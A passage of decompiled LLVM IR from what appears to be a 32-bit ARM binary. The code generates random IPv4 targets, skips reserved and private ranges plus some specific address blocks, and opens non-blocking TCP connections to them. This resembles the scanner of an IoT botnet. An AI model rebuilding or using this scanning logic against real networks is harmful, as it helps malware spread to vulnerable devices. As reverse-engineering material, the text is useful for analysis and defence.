  br i1 %v5_9da4, label %dec_label_pc_9d68, label %dec_label_pc_9da8

dec_label_pc_9da8:                                ; preds = %dec_label_pc_9d98
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v4_9db4 = call i32 @function_ab54(i32 %v2_9cbc, i8 0, i32 1024)
  store i32 ptrtoint ([71 x i8]* @global_var_13e60.152 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_9cbc, i32* @r0, align 4
  %v3_9dc0 = call i32 @function_ab24(i32 %v2_9cbc, i32 ptrtoint ([71 x i8]* @global_var_13e60.152 to i32))
  store i32 %v2_9d24, i32* @r1, align 4
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v3_9dcc = call i32 @function_aad8(i8* %v2_9cd4, i32 %v2_9d24)
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_13ea8.154 to i32), i32* @r1, align 4
  %v4_9dd8 = call i32 @function_aad8(i8* %v2_9cd4, i32 ptrtoint ([5 x i8]* @global_var_13ea8.154 to i32))
  br label %dec_label_pc_9e60

dec_label_pc_9de4:                                ; preds = %dec_label_pc_9c00
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v7_9de8 = icmp eq i32 %arg1, 1
  br i1 %v7_9de8, label %bb175, label %dec_label_pc_9df8

bb175:                                            ; preds = %dec_label_pc_9de4
  store i32 24465, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9e78

dec_label_pc_9df8:                                ; preds = %dec_label_pc_9de4
  %v7_9dfc = icmp eq i32 %arg1, 4
  br i1 %v7_9dfc, label %dec_label_pc_9e04, label %dec_label_pc_a26c

dec_label_pc_9e04:                                ; preds = %dec_label_pc_9df8
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_9e08 = call i32 @function_c77c(i32 12)
  store i32 %v1_9e08, i32* %r3.global-to-local, align 4
  store i32 %v1_9e08, i32* @global_var_1d4d4.158, align 4
  store i32 ptrtoint (i32* @global_var_1d4d8.135 to i32), i32* %ip.global-to-local, align 4
  %v0_9e1c = load i32, i32* @r4, align 4
  %v1_9e1c = trunc i32 %v0_9e1c to i8
  %v3_9e1c = add i32 %v1_9e08, 2
  %v4_9e1c = inttoptr i32 %v3_9e1c to i8*
  store i8 %v1_9e1c, i8* %v4_9e1c, align 1
  %v0_9e20 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e20 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e20 = inttoptr i32 %v1_9e20 to i32*
  store i32 %v0_9e20, i32* %v2_9e20, align 4
  %v0_9e24 = load i32, i32* @r4, align 4
  %v1_9e24 = load i32, i32* %r3.global-to-local, align 4
  %v2_9e24 = add i32 %v1_9e24, 8
  %v3_9e24 = inttoptr i32 %v2_9e24 to i32*
  store i32 %v0_9e24, i32* %v3_9e24, align 4
  %v0_9e28 = load i32, i32* @r4, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i16
  %v2_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v3_9e28 = inttoptr i32 %v2_9e28 to i16*
  store i16 %v1_9e28, i16* %v3_9e28, align 2
  store i32 61, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v5_9e38 = call i32 @function_98b8(i16 61, i32 1, i32 ptrtoint ([62 x i8]* @global_var_13eb0.161 to i32))
  store i32 31, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v5_9e48 = call i32 @function_98b8(i16 31, i32 2, i32 ptrtoint ([32 x i8]* @global_var_13ef0.163 to i32))
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v5_9e58 = call i32 @function_98b8(i16 10, i32 3, i32 ptrtoint ([11 x i8]* @global_var_13f10.165 to i32))
  br label %dec_label_pc_9e60

dec_label_pc_9e60:                                ; preds = %dec_label_pc_9da8, %dec_label_pc_9e04
  %stack_var_-2320.0 = phi i32 [ %v1_9c7c, %dec_label_pc_9da8 ], [ %tmp129, %dec_label_pc_9e04 ]
  %stack_var_-2324.0 = phi i32 [ %v1_9c58, %dec_label_pc_9da8 ], [ %tmp130, %dec_label_pc_9e04 ]
  %storemerge6 = phi i32 [ %v4_9dd8, %dec_label_pc_9da8 ], [ %v5_9e58, %dec_label_pc_9e04 ]
  %storemerge = phi i32 [ 1293, %dec_label_pc_9da8 ], [ 20736, %dec_label_pc_9e04 ]
  store i32 %storemerge6, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v5_9e60 = trunc i32 %storemerge to i16
  br label %dec_label_pc_9e78

dec_label_pc_9e70:                                ; preds = %bb174
  store i32 34254, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9e78

dec_label_pc_9e78:                                ; preds = %bb175, %dec_label_pc_9e60, %dec_label_pc_9e70
  %stack_var_-2328.2 = phi i16 [ -31282, %dec_label_pc_9e70 ], [ %v5_9e60, %dec_label_pc_9e60 ], [ 24465, %bb175 ]
  %stack_var_-2320.1 = phi i32 [ %tmp129, %dec_label_pc_9e70 ], [ %stack_var_-2320.0, %dec_label_pc_9e60 ], [ %tmp129, %bb175 ]
  %stack_var_-2324.1 = phi i32 [ %tmp130, %dec_label_pc_9e70 ], [ %stack_var_-2324.0, %dec_label_pc_9e60 ], [ %tmp130, %bb175 ]
  store i32 %v2_9bd4, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 1, i32* @r6, align 4
  store i32 %v0_9bcc, i32* %r1.global-to-local, align 4
  %v3_9eac58 = icmp eq i32 %v0_9bcc, 0
  br i1 %v3_9eac58, label %dec_label_pc_9eb4, label %dec_label_pc_9e88

dec_label_pc_9e88:                                ; preds = %dec_label_pc_9e78, %dec_label_pc_9e88
  %v0_9e88 = phi i32 [ %v1_9ea4, %dec_label_pc_9e88 ], [ %v2_9bd4, %dec_label_pc_9e78 ]
  store i32 %v0_9e88, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1048, i32* @r2, align 4
  %v4_9e94 = call i32 @function_ab54(i32 %v0_9e88, i8 0, i32 1048)
  store i32 %v4_9e94, i32* %r0.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r6, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r4, align 4
  %v3_9e98 = add i32 %v2_9e98, 17
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* @r4, align 4
  %v0_9ea0 = load i32, i32* %r5.global-to-local, align 4
  %v1_9ea0 = add i32 %v0_9ea0, 1
  store i32 %v1_9ea0, i32* %r5.global-to-local, align 4
  %v1_9ea4 = add i32 %v0_9e9c, 1048
  store i32 %v1_9ea4, i32* @r4, align 4
  store i32 %v0_9bcc, i32* %r1.global-to-local, align 4
  %v9_9eac = icmp eq i32 %v1_9ea0, %v0_9bcc
  br i1 %v9_9eac, label %dec_label_pc_9eb4, label %dec_label_pc_9e88

dec_label_pc_9eb4:                                ; preds = %dec_label_pc_9e88, %dec_label_pc_9e78
  %v2_9ebc = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v2_9ebc, i32* @sl, align 4
  br label %dec_label_pc_a8a8.preheader

dec_label_pc_9f28:                                ; preds = %dec_label_pc_a8c0
  %v1_9f28 = add i32 %v4_9ed4, 17
  %v2_9f28 = inttoptr i32 %v1_9f28 to i8*
  %v3_9f28 = load i8, i8* %v2_9f28, align 1
  %v4_9f28 = zext i8 %v3_9f28 to i32
  store i32 %v4_9f28, i32* %r3.global-to-local, align 4
  %v7_9f2c = icmp eq i8 %v3_9f28, 1
  br i1 %v7_9f2c, label %dec_label_pc_9f34, label %dec_label_pc_a074

dec_label_pc_9f34:                                ; preds = %dec_label_pc_9f28
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v4_9ed4, i32* %r0.global-to-local, align 4
  store i32 1048, i32* @r2, align 4
  %v4_9f40 = call i32 @function_ab54(i32 %v4_9ed4, i8 0, i32 1048)
  store i32 %v4_9f40, i32* %r0.global-to-local, align 4
  %v4_9f44 = sext i16 %stack_var_-2328.9.ph to i32
  store i32 %v4_9f44, i32* %r1.global-to-local, align 4
  %v2_9f48 = load i32, i32* @r5, align 4
  %v3_9f48 = add i32 %v2_9f48, 4
  %v4_9f48 = inttoptr i32 %v3_9f48 to i16*
  store i16 %stack_var_-2328.9.ph, i16* %v4_9f48, align 2
  br label %dec_label_pc_9f4c

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_a01c, %dec_label_pc_9fa8, %dec_label_pc_9fec, %dec_label_pc_a030, %.thread14, %dec_label_pc_a044, %dec_label_pc_a038, %dec_label_pc_a028, %bb177, %dec_label_pc_a00c, %dec_label_pc_9fdc, %dec_label_pc_9f98, %bb176, %dec_label_pc_9f34
  %v0_9f4c = call i32 @function_9310()
  store i32 %v0_9f4c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9f54 = call i32 @function_b5a4(i32 %v0_9f4c, i32 255)
  store i32 %v2_9f54, i32* %r0.global-to-local, align 4
  store i32 255, i32* @r6, align 4
  %v0_9f5c = call i32 @function_9310()
  store i32 %v0_9f5c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9f64 = call i32 @function_b5a4(i32 %v0_9f5c, i32 255)
  store i32 %v2_9f64, i32* %r0.global-to-local, align 4
  store i32 255, i32* @r4, align 4
  %v0_9f6c = call i32 @function_9310()
  store i32 %v0_9f6c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9f74 = call i32 @function_b5a4(i32 %v0_9f6c, i32 255)
  store i32 %v2_9f74, i32* %r0.global-to-local, align 4
  store i32 255, i32* @r7, align 4
  %v0_9f7c = call i32 @function_9310()
  store i32 %v0_9f7c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9f84 = call i32 @function_b5a4(i32 %v0_9f7c, i32 255)
  store i32 %v2_9f84, i32* %r0.global-to-local, align 4
  %v0_9f88 = load i32, i32* @r6, align 4
  %v2_9f88 = icmp eq i32 %v0_9f88, 0
  br i1 %v2_9f88, label %.thread14, label %bb176

.thread14:                                        ; preds = %dec_label_pc_9f4c
  store i32 255, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9f4c

bb176:                                            ; preds = %dec_label_pc_9f4c
  %v8_9f8c = icmp eq i32 %v0_9f88, 127
  store i32 255, i32* %r1.global-to-local, align 4
  br i1 %v8_9f8c, label %dec_label_pc_9f4c, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %bb176
  %v7_9f98 = icmp eq i32 %v0_9f88, 10
  br i1 %v7_9f98, label %dec_label_pc_9f4c, label %dec_label_pc_9fa0

dec_label_pc_9fa0:                                ; preds = %dec_label_pc_9f98
  %v7_9fa0 = icmp eq i32 %v0_9f88, 192
  br i1 %v7_9fa0, label %dec_label_pc_9fa8, label %dec_label_pc_9fb0

dec_label_pc_9fa8:                                ; preds = %dec_label_pc_9fa0
  %v0_9fa8 = load i32, i32* @r4, align 4
  %v7_9fa8 = icmp eq i32 %v0_9fa8, 168
  br i1 %v7_9fa8, label %dec_label_pc_9f4c, label %dec_label_pc_a048

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9fa0
  %v7_9fb0 = icmp eq i32 %v0_9f88, 172
  br i1 %v7_9fb0, label %dec_label_pc_9fb8, label %dec_label_pc_9fc8

dec_label_pc_9fb8:                                ; preds = %dec_label_pc_9fb0
  %v0_9fb8 = load i32, i32* @r4, align 4
  %tmp = icmp ult i32 %v0_9fb8, 16
  br i1 %tmp, label %dec_label_pc_a048, label %dec_label_pc_9fc0

dec_label_pc_9fc0:                                ; preds = %dec_label_pc_9fb8
  %v2_9fc0 = icmp ugt i32 %v0_9fb8, 30
  %v7_9fc0 = icmp eq i32 %v0_9fb8, 31
  br label %dec_label_pc_9fdc

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9fb0
  %v7_9fc8 = icmp eq i32 %v0_9f88, 100
  br i1 %v7_9fc8, label %dec_label_pc_9fd0, label %dec_label_pc_9fe4

dec_label_pc_9fd0:                                ; preds = %dec_label_pc_9fc8
  %v0_9fd0 = load i32, i32* @r4, align 4
  %tmp231 = icmp ult i32 %v0_9fd0, 64
  br i1 %tmp231, label %dec_label_pc_a048, label %dec_label_pc_9fd8

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fd0
  %v2_9fd8 = icmp ugt i32 %v0_9fd0, 125
  %v7_9fd8 = icmp eq i32 %v0_9fd0, 126
  br label %dec_label_pc_9fdc

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9fc0, %dec_label_pc_9fd8
  %v0_a04894 = phi i32 [ %v0_9ffc, %dec_label_pc_a004 ], [ %v0_9fb8, %dec_label_pc_9fc0 ], [ %v0_9fd0, %dec_label_pc_9fd8 ]
  %v1_9fdc = phi i1 [ %v2_a004, %dec_label_pc_a004 ], [ %v2_9fc0, %dec_label_pc_9fc0 ], [ %v2_9fd8, %dec_label_pc_9fd8 ]
  %v0_9fdc = phi i1 [ %v7_a004, %dec_label_pc_a004 ], [ %v7_9fc0, %dec_label_pc_9fc0 ], [ %v7_9fd8, %dec_label_pc_9fd8 ]
  %v2_9fdc = xor i1 %v1_9fdc, true
  %v3_9fdc = or i1 %v0_9fdc, %v2_9fdc
  br i1 %v3_9fdc, label %dec_label_pc_9f4c, label %dec_label_pc_a048

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9fc8
  %v7_9fe4 = icmp eq i32 %v0_9f88, 169
  br i1 %v7_9fe4, label %dec_label_pc_9fec, label %dec_label_pc_9ff4

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fe4
  %v0_9fec = load i32, i32* @r4, align 4
  %v7_9fec = icmp eq i32 %v0_9fec, 255
  br i1 %v7_9fec, label %dec_label_pc_9f4c, label %dec_label_pc_a048

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fe4
  %v7_9ff4 = icmp eq i32 %v0_9f88, 198
  br i1 %v7_9ff4, label %dec_label_pc_9ffc, label %dec_label_pc_a00c

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_9ff4
  %v0_9ffc = load i32, i32* @r4, align 4
  %tmp232 = icmp ult i32 %v0_9ffc, 18
  br i1 %tmp232, label %dec_label_pc_a048, label %dec_label_pc_a004

dec_label_pc_a004:                                ; preds = %dec_label_pc_9ffc
  %v2_a004 = icmp ne i32 %v0_9ffc, 18
  %v7_a004 = icmp eq i32 %v0_9ffc, 19
  br label %dec_label_pc_9fdc

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9ff4
  %tmp233 = icmp ugt i32 %v0_9f88, 223
  br i1 %tmp233, label %dec_label_pc_9f4c, label %dec_label_pc_a014

dec_label_pc_a014:                                ; preds = %dec_label_pc_a00c
  %v7_a014 = icmp eq i32 %v0_9f88, 106
  br i1 %v7_a014, label %dec_label_pc_a01c, label %dec_label_pc_a038

dec_label_pc_a01c:                                ; preds = %dec_label_pc_a014
  %v0_a01c = load i32, i32* @r4, align 4
  %v7_a01c = icmp eq i32 %v0_a01c, 187
  br i1 %v7_a01c, label %dec_label_pc_9f4c, label %bb177

bb177:                                            ; preds = %dec_label_pc_a01c
  %v8_a020 = icmp eq i32 %v0_a01c, 185
  br i1 %v8_a020, label %dec_label_pc_9f4c, label %dec_label_pc_a028

dec_label_pc_a028:                                ; preds = %bb177
  %v7_a028 = icmp eq i32 %v0_a01c, 184
  br i1 %v7_a028, label %dec_label_pc_9f4c, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %dec_label_pc_a028
  %v7_a030 = icmp eq i32 %v0_a01c, 186
  br i1 %v7_a030, label %dec_label_pc_9f4c, label %dec_label_pc_a048

dec_label_pc_a038:                                ; preds = %dec_label_pc_a014
  %v7_a038 = icmp eq i32 %v0_9f88, 6
  br i1 %v7_a038, label %dec_label_pc_9f4c, label %dec_label_pc_a044

dec_label_pc_a044:                                ; preds = %dec_label_pc_a038
  %v7_a040 = icmp eq i32 %v0_9f88, 11
  br i1 %v7_a040, label %dec_label_pc_9f4c, label %dec_label_pc_a044.dec_label_pc_a048_crit_edge

dec_label_pc_a044.dec_label_pc_a048_crit_edge:    ; preds = %dec_label_pc_a044
  %v0_a048.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_9fa8, %dec_label_pc_9fec, %dec_label_pc_a030, %dec_label_pc_9fdc, %dec_label_pc_9ffc, %dec_label_pc_9fd0, %dec_label_pc_9fb8, %dec_label_pc_a044.dec_label_pc_a048_crit_edge
  %v0_9f88223 = phi i32 [ %v0_9f88, %dec_label_pc_a044.dec_label_pc_a048_crit_edge ], [ 172, %dec_label_pc_9fb8 ], [ 100, %dec_label_pc_9fd0 ], [ 198, %dec_label_pc_9ffc ], [ %v0_9f88, %dec_label_pc_9fdc ], [ 106, %dec_label_pc_a030 ], [ 169, %dec_label_pc_9fec ], [ 192, %dec_label_pc_9fa8 ]
  %v0_a048 = phi i32 [ %v0_a048.pre, %dec_label_pc_a044.dec_label_pc_a048_crit_edge ], [ %v0_9fb8, %dec_label_pc_9fb8 ], [ %v0_9fd0, %dec_label_pc_9fd0 ], [ %v0_9ffc, %dec_label_pc_9ffc ], [ %v0_a04894, %dec_label_pc_9fdc ], [ %v0_a01c, %dec_label_pc_a030 ], [ %v0_9fec, %dec_label_pc_9fec ], [ %v0_9fa8, %dec_label_pc_9fa8 ]
  %v3_a048 = mul i32 %v0_a048, 65536
  %v4_a04c = mul i32 %v0_9f88223, 16777216
  %v1_a054 = load i32, i32* @r7, align 4
  %v4_a054 = mul i32 %v1_a054, 256
  %v5_a04c = or i32 %v4_a04c, %v3_a048
  %v2_a050 = or i32 %v5_a04c, %v4_a054
  %v3_a05c = udiv i32 %v2_a050, 16777216
  %v1_a058 = udiv i32 %v2_a050, 256
  %v4_a060 = and i32 %v1_a058, 65280
  %v1_a064 = and i32 %v4_a054, 65280
  store i32 %v1_a064, i32* %r1.global-to-local, align 4
  %v4_a068 = mul nuw nsw i32 %v1_a064, 256
  %v5_a060 = or i32 %v4_a068, %v3_a05c
  %v5_a068 = or i32 %v5_a060, %v4_a060
  %v5_a06c = or i32 %v5_a068, -16777216
  store i32 %v5_a06c, i32* %r3.global-to-local, align 4
  %v1_a070 = load i32, i32* @r5, align 4
  %v2_a070 = inttoptr i32 %v1_a070 to i32*
  store i32 %v5_a06c, i32* %v2_a070, align 4
  %v0_a074.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9f28, %dec_label_pc_a048
  %v0_a088 = phi i32 [ %v4_9ed4, %dec_label_pc_9f28 ], [ %v0_a074.pre, %dec_label_pc_a048 ]
  store i32 2, i32* %ip.global-to-local, align 4
  %v2_a080 = ptrtoint i32* %stack_var_-312 to i32
  store i32 %v2_a080, i32* @r3, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v1_a088 = add i32 %v0_a088, 4
  %v2_a088 = inttoptr i32 %v1_a088 to i16*
  %v3_a088 = load i16, i16* %v2_a088, align 2
  %v4_a088 = zext i16 %v3_a088 to i32
  store i32 %v4_a088, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_a09c = call i32 @function_c590(i32 2, i32 1, i32 0)
  store i32 %v3_a09c, i32* %r0.global-to-local, align 4
  %v7_a0a0 = icmp eq i32 %v3_a09c, -1
  store i32 %v3_a09c, i32* @r4, align 4
  %v1_a0a8 = load i32, i32* @r5, align 4
  %v2_a0a8 = add i32 %v1_a0a8, 8
  %v3_a0a8 = inttoptr i32 %v2_a0a8 to i32*
  store i32 %v3_a09c, i32* %v3_a0a8, align 4
  br i1 %v7_a0a0, label %dec_label_pc_a89c, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a074
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_a0b8 = call i32 @function_b7ac(i32 %v3_a09c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a0c0 = or i32 %v2_a0b8, 2048
  store i32 %v1_a0c0, i32* @r2, align 4
  %v0_a0c4 = load i32, i32* @r4, align 4
  store i32 %v0_a0c4, i32* %r0.global-to-local, align 4
  %v2_a0c8 = call i32 @function_b7ac(i32 %v0_a0c4, i32 4)
  store i32 %v2_a0c8, i32* %r0.global-to-local, align 4
  %v2_a0cc = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_a0cc, i32* %r1.global-to-local, align 4
  %v0_a0d0 = load i32, i32* @r5, align 4
  %v1_a0d0 = add i32 %v0_a0d0, 8
  %v2_a0d0 = inttoptr i32 %v1_a0d0 to i32*
  %v3_a0d0 = load i32, i32* %v2_a0d0, align 4
  store i32 %v3_a0d0, i32* %r0.global-to-local, align 4
  %v2_a0d4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_a0d4, i32* %r1.global-to-local, align 4
  %v3_a0dc = call i32 @function_c1d0(i32 %v3_a0d0, i32 %v2_a0d4, i32 16)
  store i32 %v3_a0dc, i32* %r0.global-to-local, align 4
  %v3_a0e0 = icmp eq i32 %v3_a0dc, -1
  br i1 %v3_a0e0, label %dec_label_pc_a0e8, label %dec_label_pc_a0f8

dec_label_pc_a0e8:                                ; preds = %dec_label_pc_a0b0
  %v0_a0e8 = call i32 @function_bf7c()
  store i32 %v0_a0e8, i32* %r0.global-to-local, align 4
  %v1_a0ec = inttoptr i32 %v0_a0e8 to i32*
  %v2_a0ec = load i32, i32* %v1_a0ec, align 4
  store i32 %v2_a0ec, i32* %r3.global-to-local, align 4
  %v7_a0f0 = icmp eq i32 %v2_a0ec, 115
  br i1 %v7_a0f0, label %dec_label_pc_a0f8, label %dec_label_pc_a878

dec_label_pc_a0f8:                                ; preds = %dec_label_pc_a0e8, %dec_label_pc_a0b0
  %v0_a0f8 = load i32, i32* @r5, align 4
  store i32 %v0_a0f8, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a104:                                ; preds = %dec_label_pc_a8c0
  store i32 0, i32* @r7, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 2100, i32* %r1.global-to-local, align 4
  %v2_a11c194 = load i32, i32* @sp, align 4
  %v3_a11c195 = add i32 %v2_a11c194, 2100
  %v4_a11c196 = inttoptr i32 %v3_a11c195 to i32*
  store i32 0, i32* %v4_a11c196, align 4
  br label %dec_label_pc_a10c.dec_label_pc_a10c_crit_edge

dec_label_pc_a10c.dec_label_pc_a10c_crit_edge:    ; preds = %dec_label_pc_a104, %dec_label_pc_a10c.dec_label_pc_a10c_crit_edge
  %v0_a10c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_a11c.pre = load i32, i32* @r7, align 4
  %v1_a110 = add i32 %v0_a10c.pre, 4
  store i32 %v1_a110, i32* %r3.global-to-local, align 4
  %v1_a114 = add i32 %v0_a10c.pre, 2100
  store i32 %v1_a114, i32* %r1.global-to-local, align 4
  %v7_a118 = icmp eq i32 %v1_a110, 128
  %v2_a11c = load i32, i32* @sp, align 4
  %v3_a11c = add i32 %v2_a11c, %v1_a114
  %v4_a11c = inttoptr i32 %v3_a11c to i32*
  store i32 %v0_a11c.pre, i32* %v4_a11c, align 4
  br i1 %v7_a118, label %dec_label_pc_a124, label %dec_label_pc_a10c.dec_label_pc_a10c_crit_edge

dec_label_pc_a124:                                ; preds = %dec_label_pc_a10c.dec_label_pc_a10c_crit_edge
  %v0_a124 = load i32, i32* @r5, align 4
  %v1_a124 = add i32 %v0_a124, 8
  %v2_a124 = inttoptr i32 %v1_a124 to i32*
  %v3_a124 = load i32, i32* %v2_a124, align 4
  store i32 %v3_a124, i32* %r0.global-to-local, align 4
  %v2_a128 = ptrtoint i32* %stack_var_-40 to i32
  %v3_a12c = udiv i32 %v3_a124, 32
  store i32 %v3_a12c, i32* %r3.global-to-local, align 4
  %v4_a130 = mul nuw nsw i32 %v3_a12c, 4
  %v5_a130 = add i32 %v4_a130, %v2_a128
  store i32 %v5_a130, i32* @lr, align 4
  %v1_a134 = add i32 %v5_a130, -220
  %v2_a134 = inttoptr i32 %v1_a134 to i32*
  %v3_a134 = load i32, i32* %v2_a134, align 4
  %v1_a138 = urem i32 %v3_a124, 32
  store i32 1, i32* @r6, align 4
  %v7_a140 = shl i32 1, %v1_a138
  %v8_a140 = or i32 %v3_a134, %v7_a140
  store i32 %v8_a140, i32* %v2_a134, align 4
  %v0_a154 = load i32, i32* %r0.global-to-local, align 4
  %v1_a154 = load i32, i32* @r6, align 4
  %v2_a154 = add i32 %v1_a154, %v0_a154
  store i32 %v2_a154, i32* %r0.global-to-local, align 4
  %v2_a158 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_a158, i32* %ip.global-to-local, align 4
  %v0_a15c = load i32, i32* @r7, align 4
  store i32 %v0_a15c, i32* %r1.global-to-local, align 4
  %v2_a160 = ptrtoint i32* %stack_var_-260 to i32
  store i32 %v0_a15c, i32* %r3.global-to-local, align 4
  store i32 %v0_a15c, i32* %stack_var_-56, align 4
  %v5_a170 = call i32 @function_ba0c(i32 %v2_a154, i32 %v0_a15c, i32 %v2_a160, i32 %v0_a15c, i32 %v2_a158)
  store i32 %v5_a170, i32* %r0.global-to-local, align 4
  %v1_a174 = load i32, i32* @r6, align 4
  %v9_a174 = icmp eq i32 %v5_a170, %v1_a174
  store i32 %v5_a170, i32* @r4, align 4
  br i1 %v9_a174, label %dec_label_pc_a180, label %dec_label_pc_a1fc

dec_label_pc_a180:                                ; preds = %dec_label_pc_a124
  %v1_a180 = add i32 %v5_a170, 3
  store i32 %v1_a180, i32* @r6, align 4
  store i32 %v2_a158, i32* %r3.global-to-local, align 4
  store i32 %v2_a158, i32* %ip.global-to-local, align 4
  %v0_a18c = load i32, i32* @r5, align 4
  %v1_a18c = add i32 %v0_a18c, 8
  %v2_a18c = inttoptr i32 %v1_a18c to i32*
  %v3_a18c = load i32, i32* %v2_a18c, align 4
  store i32 %v3_a18c, i32* %r0.global-to-local, align 4
  %v2_a194 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_a194, i32* %ip.global-to-local, align 4
  store i32 %v5_a170, i32* %r1.global-to-local, align 4
  %v2_a19c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_a19c, i32* @r3, align 4
  %v0_a1a0 = load i32, i32* @r7, align 4
  store i32 %v0_a1a0, i32* %stack_var_-44, align 4
  store i32 %v1_a180, i32* %stack_var_-48, align 4
  %v5_a1ac = call i32 @function_c288(i32 %v3_a18c, i32 %v5_a170, i32 %v1_a180, i32 %v2_a19c, i32 %v2_a194)
  store i32 %v5_a1ac, i32* %r0.global-to-local, align 4
  %v3_a1b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a1b0, i32* @r2, align 4
  %v2_a1b4 = icmp eq i32 %v3_a1b0, 0
  %v0_a1cc = load i32, i32* @r5, align 4
  br i1 %v2_a1b4, label %dec_label_pc_a1cc, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a180
  store i32 %v0_a1cc, i32* %r0.global-to-local, align 4
  %v0_a1c0 = load i32, i32* @r4, align 4
  store i32 %v0_a1c0, i32* %r1.global-to-local, align 4
  %extract.t = trunc i32 %v0_a1c0 to i8
  br label %dec_label_pc_a1c4

dec_label_pc_a1c4:                                ; preds = %.thread19.dec_label_pc_a1c4_crit_edge, %dec_label_pc_a7fc, %dec_label_pc_a778, %dec_label_pc_a878, %dec_label_pc_a1bc
  %v1_a1c4.off0 = phi i8 [ 1, %dec_label_pc_a878 ], [ 2, %dec_label_pc_a778 ], [ 3, %dec_label_pc_a7fc ], [ %extract.t, %dec_label_pc_a1bc ], [ %extract.t100, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %v0_a1c4 = phi i32 [ %v0_a878, %dec_label_pc_a878 ], [ %v0_a778, %dec_label_pc_a778 ], [ %v0_a7fc, %dec_label_pc_a7fc ], [ %v0_a1cc, %dec_label_pc_a1bc ], [ %v1_a200, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %stack_var_-2336.0 = phi i32 [ %stack_var_-2336.4, %dec_label_pc_a878 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a778 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a7fc ], [ %stack_var_-2336.6.ph, %dec_label_pc_a1bc ], [ %stack_var_-2336.6.ph, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %stack_var_-2316.0 = phi i16* [ %stack_var_-2316.4, %dec_label_pc_a878 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a778 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a7fc ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a1bc ], [ %stack_var_-2316.6.lcssa, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %stack_var_-2328.3 = phi i16 [ %stack_var_-2328.7, %dec_label_pc_a878 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a778 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a7fc ], [ %stack_var_-2328.9.ph, %dec_label_pc_a1bc ], [ %stack_var_-2328.9.ph, %.thread19.dec_label_pc_a1c4_crit_edge ]
